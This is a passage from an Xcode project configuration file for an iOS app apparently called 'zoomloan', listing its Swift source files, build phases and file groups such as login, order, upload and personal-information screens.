// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		730F1C882EC2DC0100733544 /* HomeTermView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C872EC2DC0100733544 /* HomeTermView.swift */; };
		730F1C8B2EC2E48B00733544 /* ProductDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C8A2EC2E48B00733544 /* ProductDetailViewController.swift */; };
		730F1C8D2EC2E54000733544 /* schemeConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C8C2EC2E54000733544 /* schemeConfig.swift */; };
		730F1C912EC2FADE00733544 /* CentertView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C902EC2FADE00733544 /* CentertView.swift */; };
		730F1C932EC2FE5200733544 /* CentertViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C922EC2FE5000733544 /* CentertViewModel.swift */; };
		730F1C952EC3008A00733544 /* CentertListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C942EC3008A00733544 /* CentertListViewCell.swift */; };
		730F1C972EC308C900733544 /* SettingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C962EC308C900733544 /* SettingViewController.swift */; };
		730F1C992EC3192900733544 /* PopDeleteAccountView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C982EC3192900733544 /* PopDeleteAccountView.swift */; };
		735C8DAB2EC4B0CC003020BF /* PopEnumListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8DAA2EC4B0CC003020BF /* PopEnumListView.swift */; };
		735C8DAD2EC4B2AE003020BF /* PopEnumListCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8DAC2EC4B2AE003020BF /* PopEnumListCell.swift */; };
		735C8DAF2EC4B9FB003020BF /* PopAddressView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8DAE2EC4B9FB003020BF /* PopAddressView.swift */; };
		735C8DB12EC4C336003020BF /* anothermodel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8DB02EC4C32F003020BF /* anothermodel.swift */; };
		735C8DB32EC4C73E003020BF /* LifeHardViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8DB22EC4C73E003020BF /* LifeHardViewController.swift */; };
		735C8DB52EC4C75F003020BF /* LiftHardViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8DB42EC4C757003020BF /* LiftHardViewModel.swift */; };
		735C8DB72EC4C8CD003020BF /* FormViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8DB62EC4C8CD003020BF /* FormViewController.swift */; };
		735C8DB92EC4C982003020BF /* FormViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8DB82EC4C982003020BF /* FormViewCell.swift */; };
		735C8DBB2EC4C99F003020BF /* FormViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8DBA2EC4C99C003020BF /* FormViewModel.swift */; };
		735C8DBD2EC4D1B4003020BF /* ConAdds.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8DBC2EC4D1A4003020BF /* ConAdds.swift */; };
		736D518B2EC6CDE1001677BD /* AppDeviceManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736D518A2EC6CDD2001677BD /* AppDeviceManager.swift */; };
		736D518D2EC6D50E001677BD /* wifiConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736D518C2EC6D504001677BD /* wifiConfig.swift */; };
		736D518F2EC6F5CA001677BD /* JailbreakDetector.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736D518E2EC6F5C9001677BD /* JailbreakDetector.swift */; };
		73736D342EC6FC840089A771 /* SystemInfo.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73736D332EC6FC7F0089A771 /* SystemInfo.swift */; };
		73A4AAD72EC21BB300224C27 /* baseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AAD62EC21BAD00224C27 /* baseModel.swift */; };
		73A4AAD92EC2207C00224C27 /* LaunchViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AAD82EC2207600224C27 /* LaunchViewModel.swift */; };
		73A4AADB2EC2344300224C27 /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AADA2EC2344200224C27 /* LoginViewModel.swift */; };
		73A4AADD2EC241FF00224C27 /* HomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AADC2EC241FF00224C27 /* HomeView.swift */; };
		73A4AADF2EC2C73000224C27 /* HomeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AADE2EC2C73000224C27 /* HomeViewModel.swift */; };
		73B8E3A42EC602A3003307AC /* LampListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B8E3A32EC602A3003307AC /* LampListView.swift */; };
		73B8E3A62EC6112A003307AC /* NetworkMonitor.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B8E3A52EC61129003307AC /* NetworkMonitor.swift */; };
		73B8E3A82EC6138C003307AC /* AppLocationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B8E3A72EC6138C003307AC /* AppLocationManager.swift */; };
		73CB1D0C2EC41EFA0066BEB9 /* UploadAuthView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D0B2EC41EFA0066BEB9 /* UploadAuthView.swift */; };
		73CB1D0E2EC421A90066BEB9 /* UploadListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D0D2EC421A90066BEB9 /* UploadListView.swift */; };
		73CB1D122EC44D6A0066BEB9 /* PopExampleView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D112EC44D6A0066BEB9 /* PopExampleView.swift */; };
		73CB1D142EC455580066BEB9 /* UploadAuthViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D132EC455550066BEB9 /* UploadAuthViewModel.swift */; };
		73CB1D162EC4599E0066BEB9 /* PopTimeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D152EC459970066BEB9 /* PopTimeView.swift */; };
		73CB1D182EC46BF50066BEB9 /* AlertNameView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D172EC46BF50066BEB9 /* AlertNameView.swift */; };
		73CB1D1B2EC46D750066BEB9 /* InputViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D1A2EC46D750066BEB9 /* InputViewCell.swift */; };
		73CB1D1D2EC46D880066BEB9 /* EnumViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D1C2EC46D880066BEB9 /* EnumViewCell.swift */; };
		73CB1D222EC483F10066BEB9 /* PeopleInfoViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D212EC483F10066BEB9 /* PeopleInfoViewController.swift */; };
		73CB1D242EC48A420066BEB9 /* PeopleInfoViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D232EC48A3B0066BEB9 /* PeopleInfoViewModel.swift */; };
		73E083302EC374F300D118A1 /* ProductDetailView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E0832F2EC374F300D118A1 /* ProductDetailView.swift */; };
		73E083322EC374FC00D118A1 /* ProductDetailViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E083312EC374FA00D118A1 /* ProductDetailViewModel.swift */; };
		73E083342EC37E3200D118A1 /* AuthListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E083332EC37E3200D118A1 /* AuthListViewCell.swift */; };
		73E083362EC3835A00D118A1 /* ChooseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E083352EC3835A00D118A1 /* ChooseViewController.swift */; };
		73E0833E2EC389C700D118A1 /* UploadImageViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E0833D2EC389C700D118A1 /* UploadImageViewController.swift */; };
		73E083402EC38EFF00D118A1 /* ChooseViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E0833F2EC38EFF00D118A1 /* ChooseViewCell.swift */; };
		73E607712EC1D6D400BCA552 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E607672EC1D6D400BCA552 /* AppDelegate.swift */; };
		73E607742EC1D6D400BCA552 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 73E607682EC1D6D400BCA552 /* Assets.xcassets */; };
		73E607762EC1D6D400BCA552 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 73E6076B2EC1D6D400BCA552 /* LaunchScreen.storyboard */; };
		73E607822EC1DB1300BCA552 /* BaseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E607812EC1DB1300BCA552 /* BaseViewController.swift */; };
		73E607842EC1DB1F00BCA552 /* BaseView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E607832EC1DB1F00BCA552 /* BaseView.swift */; };
		73E607862EC1DB3700BCA552 /* BaseNavigationController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E607852EC1DB3700BCA552 /* BaseNavigationController.swift */; };
		73E607882EC1DB5300BCA552 /* BaseTabBarController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E607872EC1DB5300BCA552 /* BaseTabBarController.swift */; };
		73E6078A2EC1DB6100BCA552 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E607892EC1DB6100BCA552 /* LoginViewController.swift */; };
		73E6078C2EC1DB6A00BCA552 /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6078B2EC1DB6A00BCA552 /* HomeViewController.swift */; };
		73E6078E2EC1DB7200BCA552 /* OrderViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6078D2EC1DB7200BCA552 /* OrderViewController.swift */; };
		73E607902EC1DB7C00BCA552 /* CenterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6078F2EC1DB7C00BCA552 /* CenterViewController.swift */; };
		73E607922EC1DBAE00BCA552 /* RequsetHttpManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E607912EC1DBAE00BCA552 /* RequsetHttpManager.swift */; };
		73E607942EC1DBC000BCA552 /* PopLogOutView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E607932EC1DBC000BCA552 /* PopLogOutView.swift */; };
		73E607962EC1DBC500BCA552 /* AuthLoginConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E607952EC1DBC400BCA552 /* AuthLoginConfig.swift */; };
		73E607982EC1DEA300BCA552 /* LaunchViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E607972EC1DEA300BCA552 /* LaunchViewController.swift */; };
		73E6079A2EC1E12200BCA552 /* otherConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E607992EC1E11700BCA552 /* otherConfig.swift */; };
		73E6079C2EC1E65C00BCA552 /* AppMainHeadView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6079B2EC1E65C00BCA552 /* AppMainHeadView.swift */; };
		73E6079E2EC1EAFB00BCA552 /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6079D2EC1EAFB00BCA552 /* LoginView.swift */; };
		73E607A02EC1EF8500BCA552 /* AgreementView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6079F2EC1EF8500BCA552 /* AgreementView.swift */; };
		73F4856A2EC569B000548EDA /* H5WebViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F485692EC569B000548EDA /* H5WebViewController.swift */; };
		73F4856C2EC5871200548EDA /* OrderListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F4856B2EC5871200548EDA /* OrderListView.swift */; };
		73F4856E2EC5872A00548EDA /* OrderListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F4856D2EC5872A00548EDA /* OrderListViewCell.swift */; };
		73F485712EC5890F00548EDA /* OrderListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F485702EC5890E00548EDA /* OrderListViewModel.swift */; };
		73F485732EC5A15100548EDA /* OrderNameTypeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F485722EC5A15100548EDA /* OrderNameTypeView.swift */; };
		73F485752EC5B51100548EDA /* LampView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F485742EC5B51100548EDA /* LampView.swift */; };
		73F485772EC5C8A700548EDA /* LibraryView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F485762EC5C8A700548EDA /* LibraryView.swift */; };
		B34653ED6B1422878E0AF04B /* Pods_zoomloan.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 877AD7D50AB02863229ED243 /* Pods_zoomloan.framework */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		2C1361B114CA9F5AC485FDAA /* Pods-zoomloan.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-zoomloan.debug.xcconfig"; path = "Target Support Files/Pods-zoomloan/Pods-zoomloan.debug.xcconfig"; sourceTree = "<group>"; };
		3DF5FA68AD1B7150282582AA /* Pods-zoomloan.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-zoomloan.release.xcconfig"; path = "Target Support Files/Pods-zoomloan/Pods-zoomloan.release.xcconfig"; sourceTree = "<group>"; };
		730F1C872EC2DC0100733544 /* HomeTermView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeTermView.swift; sourceTree = "<group>"; };
		730F1C8A2EC2E48B00733544 /* ProductDetailViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailViewController.swift; sourceTree = "<group>"; };
		730F1C8C2EC2E54000733544 /* schemeConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = schemeConfig.swift; sourceTree = "<group>"; };
		730F1C902EC2FADE00733544 /* CentertView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CentertView.swift; sourceTree = "<group>"; };
		730F1C922EC2FE5000733544 /* CentertViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CentertViewModel.swift; sourceTree = "<group>"; };
		730F1C942EC3008A00733544 /* CentertListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CentertListViewCell.swift; sourceTree = "<group>"; };
		730F1C962EC308C900733544 /* SettingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingViewController.swift; sourceTree = "<group>"; };
		730F1C982EC3192900733544 /* PopDeleteAccountView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopDeleteAccountView.swift; sourceTree = "<group>"; };
		735C8DAA2EC4B0CC003020BF /* PopEnumListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopEnumListView.swift; sourceTree = "<group>"; };
		735C8DAC2EC4B2AE003020BF /* PopEnumListCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopEnumListCell.swift; sourceTree = "<group>"; };
		735C8DAE2EC4B9FB003020BF /* PopAddressView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopAddressView.swift; sourceTree = "<group>"; };
		735C8DB02EC4C32F003020BF /* anothermodel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = anothermodel.swift; sourceTree = "<group>"; };
		735C8DB22EC4C73E003020BF /* LifeHardViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LifeHardViewController.swift; sourceTree = "<group>"; };
		735C8DB42EC4C757003020BF /* LiftHardViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LiftHardViewModel.swift; sourceTree = "<group>"; };
		735C8DB62EC4C8CD003020BF /* FormViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FormViewController.swift; sourceTree = "<group>"; };
		735C8DB82EC4C982003020BF /* FormViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FormViewCell.swift; sourceTree = "<group>"; };
		735C8DBA2EC4C99C003020BF /* FormViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FormViewModel.swift; sourceTree = "<group>"; };
		735C8DBC2EC4D1A4003020BF /* ConAdds.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ConAdds.swift; sourceTree = "<group>"; };
		736D518A2EC6CDD2001677BD /* AppDeviceManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDeviceManager.swift; sourceTree = "<group>"; };
		736D518C2EC6D504001677BD /* wifiConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = wifiConfig.swift; sourceTree = "<group>"; };
		736D518E2EC6F5C9001677BD /* JailbreakDetector.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JailbreakDetector.swift; sourceTree = "<group>"; };
		73736D332EC6FC7F0089A771 /* SystemInfo.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SystemInfo.swift; sourceTree = "<group>"; };
		73A4AAD62EC21BAD00224C27 /* baseModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = baseModel.swift; sourceTree = "<group>"; };
		73A4AAD82EC2207600224C27 /* LaunchViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchViewModel.swift; sourceTree = "<group>"; };
		73A4AADA2EC2344200224C27 /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
		73A4AADC2EC241FF00224C27 /* HomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeView.swift; sourceTree = "<group>"; };
		73A4AADE2EC2C73000224C27 /* HomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewModel.swift; sourceTree = "<group>"; };
		73B8E3A32EC602A3003307AC /* LampListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LampListView.swift; sourceTree = "<group>"; };
		73B8E3A52EC61129003307AC /* NetworkMonitor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkMonitor.swift; sourceTree = "<group>"; };
		73B8E3A72EC6138C003307AC /* AppLocationManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppLocationManager.swift; sourceTree = "<group>"; };
		73CB1D0B2EC41EFA0066BEB9 /* UploadAuthView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UploadAuthView.swift; sourceTree = "<group>"; };
		73CB1D0D2EC421A90066BEB9 /* UploadListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UploadListView.swift; sourceTree = "<group>"; };
		73CB1D112EC44D6A0066BEB9 /* PopExampleView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopExampleView.swift; sourceTree = "<group>"; };
		73CB1D132EC455550066BEB9 /* UploadAuthViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UploadAuthViewModel.swift; sourceTree = "<group>"; };
		73CB1D152EC459970066BEB9 /* PopTimeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopTimeView.swift; sourceTree = "<group>"; };
		73CB1D172EC46BF50066BEB9 /* AlertNameView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlertNameView.swift; sourceTree = "<group>"; };
		73CB1D1A2EC46D750066BEB9 /* InputViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = InputViewCell.swift; sourceTree = "<group>"; };
		73CB1D1C2EC46D880066BEB9 /* EnumViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EnumViewCell.swift; sourceTree = "<group>"; };
		73CB1D212EC483F10066BEB9 /* PeopleInfoViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PeopleInfoViewController.swift; sourceTree = "<group>"; };
		73CB1D232EC48A3B0066BEB9 /* PeopleInfoViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PeopleInfoViewModel.swift; sourceTree = "<group>"; };
		73E0832F2EC374F300D118A1 /* ProductDetailView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailView.swift; sourceTree = "<group>"; };
		73E083312EC374FA00D118A1 /* ProductDetailViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailViewModel.swift; sourceTree = "<group>"; };
		73E083332EC37E3200D118A1 /* AuthListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthListViewCell.swift; sourceTree = "<group>"; };
		73E083352EC3835A00D118A1 /* ChooseViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChooseViewController.swift; sourceTree = "<group>"; };
		73E0833D2EC389C700D118A1 /* UploadImageViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UploadImageViewController.swift; sourceTree = "<group>"; };
		73E0833F2EC38EFF00D118A1 /* ChooseViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChooseViewCell.swift; sourceTree = "<group>"; };
		73E6074F2EC1D6CA00BCA552 /* zoomloan.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = zoomloan.app; sourceTree = BUILT_PRODUCTS_DIR; };
		73E607672EC1D6D400BCA552 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		73E607682EC1D6D400BCA552 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		73E607692EC1D6D400BCA552 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		73E6076A2EC1D6D400BCA552 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		73E6077D2EC1DAB500BCA552 /* zoomloan.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = zoomloan.entitlements; sourceTree = "<group>"; };
		73E607812EC1DB1300BCA552 /* BaseViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseViewController.swift; sourceTree = "<group>"; };
		73E607832EC1DB1F00BCA552 /* BaseView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseView.swift; sourceTree = "<group>"; };
		73E607852EC1DB3700BCA552 /* BaseNavigationController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseNavigationController.swift; sourceTree = "<group>"; };
		73E607872EC1DB5300BCA552 /* BaseTabBarController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseTabBarController.swift; sourceTree = "<group>"; };
		73E607892EC1DB6100BCA552 /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
		73E6078B2EC1DB6A00BCA552 /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
		73E6078D2EC1DB7200BCA552 /* OrderViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderViewController.swift; sourceTree = "<group>"; };
		73E6078F2EC1DB7C00BCA552 /* CenterViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterViewController.swift; sourceTree = "<group>"; };
		73E607912EC1DBAE00BCA552 /* RequsetHttpManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RequsetHttpManager.swift; sourceTree = "<group>"; };
		73E607932EC1DBC000BCA552 /* PopLogOutView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopLogOutView.swift; sourceTree = "<group>"; };
		73E607952EC1DBC400BCA552 /* AuthLoginConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthLoginConfig.swift; sourceTree = "<group>"; };
		73E607972EC1DEA300BCA552 /* LaunchViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchViewController.swift; sourceTree = "<group>"; };
		73E607992EC1E11700BCA552 /* otherConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = otherConfig.swift; sourceTree = "<group>"; };
		73E6079B2EC1E65C00BCA552 /* AppMainHeadView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppMainHeadView.swift; sourceTree = "<group>"; };
		73E6079D2EC1EAFB00BCA552 /* LoginView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
		73E6079F2EC1EF8500BCA552 /* AgreementView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AgreementView.swift; sourceTree = "<group>"; };
		73F485692EC569B000548EDA /* H5WebViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = H5WebViewController.swift; sourceTree = "<group>"; };
		73F4856B2EC5871200548EDA /* OrderListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListView.swift; sourceTree = "<group>"; };
		73F4856D2EC5872A00548EDA /* OrderListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListViewCell.swift; sourceTree = "<group>"; };
		73F485702EC5890E00548EDA /* OrderListViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListViewModel.swift; sourceTree = "<group>"; };
		73F485722EC5A15100548EDA /* OrderNameTypeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderNameTypeView.swift; sourceTree = "<group>"; };
		73F485742EC5B51100548EDA /* LampView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LampView.swift; sourceTree = "<group>"; };
		73F485762EC5C8A700548EDA /* LibraryView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LibraryView.swift; sourceTree = "<group>"; };
		877AD7D50AB02863229ED243 /* Pods_zoomloan.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_zoomloan.framework; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		73E6074C2EC1D6CA00BCA552 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				B34653ED6B1422878E0AF04B /* Pods_zoomloan.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		4C336D7C4C34DF23EE592941 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				877AD7D50AB02863229ED243 /* Pods_zoomloan.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		730F1C892EC2E47A00733544 /* auth */ = {
			isa = PBXGroup;
			children = (
				73CB1D192EC46D580066BEB9 /* cell */,
				73E083382EC3838000D118A1 /* detail */,
				73E083372EC3837900D118A1 /* choose */,
				73CB1D0A2EC41ECF0066BEB9 /* upload */,
				73CB1D1F2EC483B70066BEB9 /* work */,
				73CB1D1E2EC483A60066BEB9 /* person */,
				73CB1D202EC483BB0066BEB9 /* conact */,
			);
			path = auth;
			sourceTree = "<group>";
		};
		73CB1D0A2EC41ECF0066BEB9 /* upload */ = {
			isa = PBXGroup;
			children = (
				73CB1D132EC455550066BEB9 /* UploadAuthViewModel.swift */,
				73E0833D2EC389C700D118A1 /* UploadImageViewController.swift */,
				73CB1D0B2EC41EFA0066BEB9 /* UploadAuthView.swift */,
				73CB1D0D2EC421A90066BEB9 /* UploadListView.swift */,
				73CB1D172EC46BF50066BEB9 /* AlertNameView.swift */,
				73CB1D152EC459970066BEB9 /* PopTimeView.swift */,
			);
			path = upload;
			sourceTree = "<group>";
		};
		73CB1D192EC46D580066BEB9 /* cell */ = {
			isa = PBXGroup;
			children = (
				73CB1D1A2EC46D750066BEB9 /* InputViewCell.swift */,
				73CB1D1C2EC46D880066BEB9 /* EnumViewCell.swift */,
			);
			path = cell;
			sourceTree = "<group>";
		};
		73CB1D1E2EC483A60066BEB9 /* person */ = {
			isa = PBXGroup;
			children = (
				73CB1D232EC48A3B0066BEB9 /* PeopleInfoViewModel.swift */,
				73CB1D212EC483F10066BEB9 /* PeopleInfoViewController.swift */,
				735C8DAA2EC4B0CC003020BF /* PopEnumListView.swift */,
				735C8DAC2EC4B2AE003020BF /* PopEnumListCell.swift */,
				735C8DAE2EC4B9FB003020BF /* PopAddressView.swift */,
			);
			path = person;
			sourceTree = "<group>";
		};
		73CB1D1F2EC483B70066BEB9 /* work */ = {
			isa = PBXGroup;
			children = (
				735C8DB42EC4C757003020BF /* LiftHardViewModel.swift */,
				735C8DB22EC4C73E003020BF /* LifeHardViewController.swift */,
			);
			path = work;
			sourceTree = "<group>";
		};
		73CB1D202EC483BB0066BEB9 /* conact */ = {
			isa = PBXGroup;
			children = (
